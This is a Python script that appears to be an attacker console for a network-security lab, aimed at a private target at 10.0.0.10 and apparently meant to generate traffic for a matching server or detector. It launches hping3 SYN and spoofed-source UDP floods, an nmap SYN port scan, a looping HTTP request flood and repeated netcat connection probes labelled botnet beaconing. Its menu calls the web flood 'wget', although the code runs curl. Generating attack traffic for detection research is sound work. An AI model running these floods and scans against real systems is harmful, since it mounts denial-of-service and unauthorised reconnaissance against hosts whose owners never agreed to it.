import os
import sys
import time
import subprocess
import argparse

TARGET_IP = "10.0.0.10"

# Attack commands matching server.py for consistent patterns
ATTACK_COMMANDS = {
    # SYN Flood: Increased rate, faster interval (same as server.py)
    'syn': f"hping3 -S -p 80 -i u100 {TARGET_IP}",
    
    # UDP Flood: Use hping3 UDP mode (same as server.py)
    'udp': f"hping3 --udp -p 80 -i u1000 --rand-source {TARGET_IP}",
    
    # Port Scan: Faster scan, common ports (same as server.py)
    'scan': f"nmap -sS -T4 -p 21,22,23,25,53,80,110,443,3306,8080 --open {TARGET_IP}",
    
    # Web Attack: Continuous curl requests (now same as server.py)
    'web': f"curl -s -o /dev/null --connect-timeout 2 http://{TARGET_IP}/",
    
    # Botnet: Repeated connection attempts (same as server.py)
    'botnet': f"nc -z -v -w 1 {TARGET_IP} 80"
}

def run_attack(cmd, duration=10):
    print(f"\n[⚔️] LAUNCHING: {cmd}")
    print(f"[⏱️] Duration: {duration} seconds")
    
    try:
        # Use timeout to stop attack after duration
        subprocess.run(cmd, shell=True, timeout=duration)
    except subprocess.TimeoutExpired:
        print("[*] Attack finished.")
    except KeyboardInterrupt:
        print("[!] Attack stopped manually.")

def run_web_attack(duration=10):
    """Run web attack in loop (same pattern as server.py)"""
    print(f"\n[⚔️] LAUNCHING: Web Attack (curl loop)")
    print(f"[⏱️] Duration: {duration} seconds")
    import random
    start_time = time.time()
    while (time.time() - start_time) < duration:
        try:
            subprocess.run(ATTACK_COMMANDS['web'], shell=True, 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
            time.sleep(random.uniform(0.01, 0.05))
        except subprocess.TimeoutExpired:
            pass
        except KeyboardInterrupt:
            print("[!] Attack stopped manually.")
            break
    print("[*] Attack finished.")

def run_botnet_attack(duration=10):
    """Run botnet beaconing in loop (same pattern as server.py)"""
    print(f"\n[⚔️] LAUNCHING: Botnet Beaconing")
    print(f"[⏱️] Duration: {duration} seconds")
    
    start_time = time.time()
    while (time.time() - start_time) < duration:
        try:
            subprocess.run(ATTACK_COMMANDS['botnet'], shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            time.sleep(2)
        except subprocess.TimeoutExpired:
            pass
        except KeyboardInterrupt:
            print("[!] Attack stopped manually.")
            break
    print("[*] Attack finished.")

def interactive_menu():
    print("\n--- 💀 ATTACK CONSOLE (ns_attacker) ---")
    print(f"Target: {TARGET_IP}")
    print("1. DoS: SYN Flood (hping3)")
    print("2. DoS: UDP Flood (hping3)")
    print("3. Probe: TCP Port Scan (nmap)")
    print("4. Web: HTTP Flood (wget)")
    print("5. Botnet: C&C Beaconing (netcat)")
    print("0. Exit")
    return input("Select attack > ")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--attack", choices=['syn', 'udp', 'scan', 'web', 'botnet'], help="Run specific attack")
    parser.add_argument("--duration", type=int, default=10, help="Attack duration")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("Run as sudo!")
        sys.exit(1)

    if args.attack:
        # Automated mode - using same commands as server.py
        if args.attack == 'syn':
            run_attack(ATTACK_COMMANDS['syn'], duration=args.duration)
        elif args.attack == 'udp':
            run_attack(ATTACK_COMMANDS['udp'], duration=args.duration)
        elif args.attack == 'scan':
            run_attack(ATTACK_COMMANDS['scan'], duration=args.duration)
        elif args.attack == 'web':
            run_web_attack(duration=args.duration)
        elif args.attack == 'botnet':
            run_botnet_attack(duration=args.duration)
    else:
        # Interactive mode
        while True:
            choice = interactive_menu()
            if choice == '1': run_attack(ATTACK_COMMANDS['syn'], duration=15)
            elif choice == '2': run_attack(ATTACK_COMMANDS['udp'], duration=10)
            elif choice == '3': run_attack(ATTACK_COMMANDS['scan'], duration=20)
            elif choice == '4': run_web_attack(duration=10)
            elif choice == '5': run_botnet_attack(duration=10)
            elif choice == '0': break
